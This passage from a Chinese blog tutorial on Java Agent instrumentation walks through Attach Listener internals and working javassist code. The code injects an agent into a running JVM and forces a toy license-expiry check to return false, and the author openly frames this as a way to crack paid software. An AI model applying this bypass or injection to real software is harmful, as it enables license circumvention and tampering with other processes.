<h3 id="实战三：代码插桩"><a href="#实战三：代码插桩" class="headerlink" title="实战三：代码插桩"></a>实战三：代码插桩</h3><p>这里复现一下<a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open" target="_blank" rel="noopener">yz</a>的实验。这个例子写得很好，类似于破解官方软件的一种绕过过程，毕竟白嫖才是最香的。</p>
<p>首先这里有一个校验函数用来判断用户是否已经过了有效期，这个截止日期是硬编码在代码中的，由于是写死的那么就会一直提示已经过期：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CheckLicense</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> SimpleDateFormat DATE_FORMAT = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkExpiry</span><span class="params">(String expireDate)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Date date = DATE_FORMAT.parse(expireDate);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检测当前系统时间早于License授权截至时间</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> Date().before(date)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 设置一个已经过期的License时间</span></span><br><span class="line">        <span class="keyword">final</span> String expireDate = <span class="string">"2020-10-01 00:00:00"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        String time = <span class="string">"["</span> + DATE_FORMAT.format(<span class="keyword">new</span> Date()) + <span class="string">"] "</span>;</span><br><span class="line">                        <span class="comment">// 检测license是否已经过期</span></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (checkExpiry(expireDate)) &#123;</span><br><span class="line">                                System.err.println(time + <span class="string">"您的授权已过期，请重新购买授权！"</span>);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                System.out.println(time + <span class="string">"您的授权正常，截止时间为："</span> + expireDate);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// sleep 1秒</span></span><br><span class="line">                        TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>硬编码有效期是一个已经过期的License时间<code>final String expireDate = &quot;2020-10-01 00:00:00&quot;;</code></p>
<p>已经过期：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209231744276.png" alt="image-20210209231744276"></p>
<p>这里开始编写Agent：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassFileTransformerDemo</span>  <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要被Hook的类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String HOOK_CLASS = <span class="string">"com.sec.CheckLicense"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将目录路径替换成Java类名</span></span><br><span class="line">        String cn = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只处理HOOK_CLASS类的字节码</span></span><br><span class="line">        <span class="keyword">if</span> (cn.equals(HOOK_CLASS)) &#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(cn);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClassPool classPool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 使用javassist将类二进制解析成CtClass对象</span></span><br><span class="line">                CtClass ctClass = classPool.makeClass(<span class="keyword">new</span> ByteArrayInputStream(classfileBuffer));</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 使用CtClass对象获取checkExpiry方法，类似于Java反射机制的clazz.getDeclaredMethod(xxx)</span></span><br><span class="line">                CtMethod ctMethod = ctClass.getDeclaredMethod(</span><br><span class="line">                        <span class="string">"checkExpiry"</span>, <span class="keyword">new</span> CtClass[]&#123;classPool.getCtClass(<span class="string">"java.lang.String"</span>)&#125;</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 在checkExpiry方法执行前插入输出License到期时间代码</span></span><br><span class="line">                ctMethod.insertBefore(<span class="string">"System.out.println(\"License到期时间：\" + $1);"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 修改checkExpiry方法的返回值，将授权过期改为未过期</span></span><br><span class="line">                ctMethod.insertAfter(<span class="string">"return false;"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 修改后的类字节码</span></span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里相当于将检测日期函数写死return false。</p>
<p>打包，运行：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210034102611.png" alt="image-20210210034102611"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>MANIFEST.MF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/DEPENDENCIES<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/LICENSE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/NOTICE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactSet</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>org.javassist:javassist:jar:*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">artifactSet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="comment">&lt;!-- 修改第三方依赖包名称 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">relocations</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">relocation</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">shadedPattern</span>&gt;</span>com.fxc.deps.javassist<span class="tag">&lt;/<span class="name">shadedPattern</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">relocation</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">relocations</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="启动中进行Agent-Attach"><a href="#启动中进行Agent-Attach" class="headerlink" title="启动中进行Agent Attach"></a>启动中进行Agent Attach</h2><p>之前的<code>permain</code>方法只能在java程序启动之前执行，而Java SE 6的新特性改变了这种情况，可以通过Java Tool API中的attach方式来达到这种程序启动之后设置代理的效果。</p>
<p>下面来分析一下动态加载Agent的相关技术细节。</p>
<h3 id="AttachListener"><a href="#AttachListener" class="headerlink" title="AttachListener"></a>AttachListener</h3><p>Attach机制通过Attach Listener线程来进行相关事务的处理，下面来看一下Attach Listener线程是如何初始化的。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Starts the Attach Listener thread</span></span><br><span class="line"><span class="comment">//创建AttachListener线程</span></span><br><span class="line"><span class="keyword">void</span> AttachListener::init() &#123;</span><br><span class="line">  <span class="comment">// 创建线程相关部分代码被去掉了</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> thread_name[] = <span class="string">"Attach Listener"</span>;</span><br><span class="line">  Handle <span class="built_in">string</span> = java_lang_String::create_from_str(thread_name, THREAD);</span><br><span class="line">  &#123; <span class="function">MutexLocker <span class="title">mu</span><span class="params">(Threads_lock)</span></span>;</span><br><span class="line">    JavaThread* listener_thread = <span class="keyword">new</span> JavaThread(&amp;attach_listener_thread_entry);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个线程启动之后都需要指定一个入口来执行代码，Attach Listener线程的入口是attach_listener_thread_entry，下面看一下这个函数的具体实现：</p>
<p>下面看attach_listener_thread_entry的具体实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">attach_listener_thread_entry</span><span class="params">(JavaThread* thread, TRAPS)</span> </span>&#123;</span><br><span class="line">  AttachListener::set_initialized();</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    	<span class="comment">//拉取一个需要执行的任务</span></span><br><span class="line">      AttachOperation* op = AttachListener::dequeue();</span><br><span class="line">      <span class="comment">// find the function to dispatch too</span></span><br><span class="line">      AttachOperationFunctionInfo* info = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; funcs[i].name != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* name = funcs[i].name;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(op-&gt;name(), name) == <span class="number">0</span>) &#123;</span><br><span class="line">          info = &amp;(funcs[i]); <span class="keyword">break</span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">       <span class="comment">// dispatch to the function that implements this operation</span></span><br><span class="line">        res = (info-&gt;func)(op, &amp;st);</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>整个函数执行逻辑，大概是这样的：</p>
<ul>
<li>拉取一个需要执行的任务：AttachListener::dequeue。</li>
<li>查询匹配的命令处理函数。</li>
<li>执行匹配到的命令执行函数。</li>
</ul>
<p>其中第二步里面存在一个命令函数表，整个表如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> AttachOperationFunctionInfo funcs[] = &#123;</span><br><span class="line">  &#123; <span class="string">"agentProperties"</span>,  get_agent_properties &#125;,</span><br><span class="line">  &#123; <span class="string">"datadump"</span>,         data_dump &#125;,</span><br><span class="line">  &#123; <span class="string">"dumpheap"</span>,         dump_heap &#125;,</span><br><span class="line">  &#123; <span class="string">"load"</span>,             load_agent &#125;,</span><br><span class="line">  &#123; <span class="string">"properties"</span>,       get_system_properties &#125;,</span><br><span class="line">  &#123; <span class="string">"threaddump"</span>,       thread_dump &#125;,</span><br><span class="line">  &#123; <span class="string">"inspectheap"</span>,      heap_inspection &#125;,</span><br><span class="line">  &#123; <span class="string">"setflag"</span>,          set_flag &#125;,</span><br><span class="line">  &#123; <span class="string">"printflag"</span>,        print_flag &#125;,</span><br><span class="line">  &#123; <span class="string">"jcmd"</span>,             jcmd &#125;,</span><br><span class="line">  &#123; <span class="literal">NULL</span>,               <span class="literal">NULL</span> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>对于加载Agent来说，命令就是“load”。</p>
<p>任务从哪来，这个秘密就藏在AttachListener::dequeue这行代码里面，接下来来分析一下dequeue这个函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">LinuxAttachOperation* LinuxAttachListener::dequeue() &#123;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// wait for client to connect</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">    RESTARTABLE(::accept(listener(), &amp;addr, &amp;len), s);</span><br><span class="line">    <span class="comment">// get the credentials of the peer and check the effective uid/guid</span></span><br><span class="line">    <span class="comment">// - check with jeff on this.</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucred</span> <span class="title">cred_info</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> optlen = <span class="keyword">sizeof</span>(cred_info);</span><br><span class="line">    <span class="keyword">if</span> (::getsockopt(s, SOL_SOCKET, SO_PEERCRED, (<span class="keyword">void</span>*)&amp;cred_info, &amp;optlen) == <span class="number">-1</span>) &#123;</span><br><span class="line">      ::<span class="built_in">close</span>(s);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// peer credential look okay so we read the request</span></span><br><span class="line">    LinuxAttachOperation* op = read_request(s);</span><br><span class="line">    <span class="keyword">return</span> op;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码表明，Attach Listener在某个端口监听着，通过accept来接收一个连接，然后从这个连接里面将请求读取出来，然后将请求包装成一个AttachOperation类型的对象，之后就会从表里查询对应的处理函数，然后进行处理。</p>
<p>Attach Listener使用一种被称为“懒加载”的策略进行初始化，也就是说，JVM启动的时候Attach Listener并不一定会启动起来。</p>
<h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>运行时Attach方法里面的关键是调用VirtualMachine的attach方法进行Agent挂载的功能。</p>
<p>下面分析一下VirtualMachine的attach方法具体是怎么实现的。</p>
<p>Attach模式需要知道我们运行的Java程序进程ID，通过Java虚拟机的进程注入方式实现可以将我们的Agent程序动态的注入到一个已在运行中的Java程序中。</p>
<p>还是之前那个例子，可以使用<code>jps -l</code>命令进行查看：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210194815301.png" alt="image-20210210194815301"></p>
<p>Java代码实现可以使用<code>com.sun.tools.attach.VirtualMachine</code>的<code>list</code>方法即可获取本机所有运行的Java进程，如：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210200251210.png" alt="image-20210210200251210"></p>
<p>有了进程ID我们就可以使用Attach API注入Agent了，Attach Java进程注入通用示例代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Java进程ID</span></span><br><span class="line">String pid = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置Agent文件的绝对路径</span></span><br><span class="line">String agentPath = <span class="string">"/xxx/agent.jar"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注入到JVM虚拟机进程</span></span><br><span class="line">VirtualMachine vm = VirtualMachine.attach(pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注入Agent到目标JVM</span></span><br><span class="line">vm.loadAgent(agentPath);</span><br><span class="line">vm.detach();</span><br></pre></td></tr></table></figure>

<p>使用Attach模式启动Agent程序时需要使用到JDK目录下的<code>lib/tools.jar</code>，如果没有配置<code>CLASS_PATH</code>环境变量的话需要在运行Agent程序时添加<code>-Xbootclasspath/a:$JAVA_HOME/lib/tools.jar</code>参数，否则无法使用Attach API。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">java -Xbootclasspath/a:$JAVA_HOME/lib/tools.jar -jar AgentAttach<span class="number">-1.0</span>-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>

<p>首先后台运行监测代码，用我们的jar包获取目标进程：16281</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210222948056.png" alt="image-20210210222948056"></p>
<p>接下来直接注入就完事了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -Xbootclasspath/a:$JAVA_HOME/lib/tools.jar -classpath $JAVA_HOME/lib/tools.jar:AgentAttach-<span class="number">1.0</span>-SNAPSHOT.jar -jar AgentAttach-<span class="number">1.0</span>-SNAPSHOT.jar <span class="number">16281</span></span><br></pre></td></tr></table></figure>

<p>成功修改：</p>
<p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210223115419.png" alt="image-20210210223115419"></p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AttachAgent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要被Hook的类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String HOOK_CLASS = <span class="string">"com.sec.CheckLicense"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length == <span class="number">0</span>) &#123;</span><br><span class="line">            List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">            <span class="keyword">for</span> (VirtualMachineDescriptor desc : list) &#123;</span><br><span class="line">                System.out.println(<span class="string">"进程ID："</span> + desc.id() + <span class="string">"，进程名称："</span> + desc.displayName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Java进程ID</span></span><br><span class="line">        String pid = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 注入到JVM虚拟机进程</span></span><br><span class="line">            VirtualMachine vm = VirtualMachine.attach(pid);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取当前Agent的jar包路径</span></span><br><span class="line">            URL agentURL = AttachAgent<span class="class">.<span class="keyword">class</span>.<span class="title">getProtectionDomain</span>().<span class="title">getCodeSource</span>().<span class="title">getLocation</span>()</span>;</span><br><span class="line">            String agentPath = <span class="keyword">new</span> File(agentURL.toURI()).getAbsolutePath();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 注入Agent到目标JVM</span></span><br><span class="line">            vm.loadAgent(agentPath);</span><br><span class="line">            vm.detach();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args, <span class="keyword">final</span> Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        loadAgent(args, inst);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadAgent</span><span class="params">(String arg, <span class="keyword">final</span> Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建ClassFileTransformer对象</span></span><br><span class="line">        ClassFileTransformer classFileTransformer = createClassFileTransformer();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加自定义的Transformer，第二个参数true表示是否允许Agent Retransform，</span></span><br><span class="line">        <span class="comment">// 需配合MANIFEST.MF中的Can-Retransform-Classes: true配置</span></span><br><span class="line">        inst.addTransformer(classFileTransformer, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取所有已经被JVM加载的类对象</span></span><br><span class="line">        Class[] loadedClass = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Class clazz : loadedClass) &#123;</span><br><span class="line">            String className = clazz.getName();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (inst.isModifiableClass(clazz)) &#123;</span><br><span class="line">                <span class="comment">// 使用Agent重新加载HelloWorld类的字节码</span></span><br><span class="line">                <span class="keyword">if</span> (className.equals(HOOK_CLASS)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        inst.retransformClasses(clazz);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (UnmodifiableClassException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ClassFileTransformer <span class="title">createClassFileTransformer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ClassFileTransformer() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 类文件转换方法，重写transform方法可获取到待加载的类相关信息</span></span><br><span class="line"><span class="comment">             *</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> loader              定义要转换的类加载器；如果是引导加载器，则为 null</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> className           类名,如:java/lang/Runtime</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> protectionDomain    要定义或重定义的类的保护域</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@return</span> 字节码byte数组。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                                    ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将目录路径替换成Java类名</span></span><br><span class="line">                className = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 只处理HOOK_CLASS类的字节码</span></span><br><span class="line">                <span class="keyword">if</span> (className.equals(HOOK_CLASS)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 使用javassist将类二进制解析成CtClass对象</span></span><br><span class="line">                        CtClass ctClass = classPool.makeClass(<span class="keyword">new</span> ByteArrayInputStream(classfileBuffer));</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 使用CtClass对象获取checkExpiry方法，类似于Java反射机制的clazz.getDeclaredMethod(xxx)</span></span><br><span class="line">                        CtMethod ctMethod = ctClass.getDeclaredMethod(</span><br><span class="line">                                <span class="string">"checkExpiry"</span>, <span class="keyword">new</span> CtClass[]&#123;classPool.getCtClass(<span class="string">"java.lang.String"</span>)&#125;</span><br><span class="line">                        );</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 在checkExpiry方法执行前插入输出License到期时间代码</span></span><br><span class="line">                        ctMethod.insertBefore(<span class="string">"System.out.println(\"License到期时间：\" + $1);"</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 修改checkExpiry方法的返回值，将授权过期改为未过期</span></span><br><span class="line">                        ctMethod.insertAfter(<span class="string">"return false;"</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 修改后的类字节码</span></span><br><span class="line">                        classfileBuffer = ctClass.toBytecode();</span><br><span class="line">                        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Pom.xml</p>
